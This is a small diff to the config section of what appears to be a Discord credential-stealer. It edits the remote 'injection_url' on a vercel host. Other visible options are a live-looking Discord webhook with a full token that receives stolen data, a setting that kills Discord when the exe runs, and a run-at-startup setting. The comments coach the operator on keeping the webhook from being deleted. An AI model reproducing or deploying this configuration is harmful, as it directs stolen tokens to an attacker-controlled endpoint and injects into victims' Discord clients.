@@ -35,7 +35,7 @@ config = {
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "https://discord.com/api/webhooks/1343671090408325203/kV5qiQ8GMEPF4uFxkXgOmvxQnG8DNNmzdsWdpzqBGboY5SPcs9YIlK_QnT7hEQ_aZwo2",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://tenor-eight-ecru.vercel.app/api/image",
+    'injection_url': "https://tenor-eight-ecru.vercel.app/api/data",
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': False,
     # if you want the file to run at startup
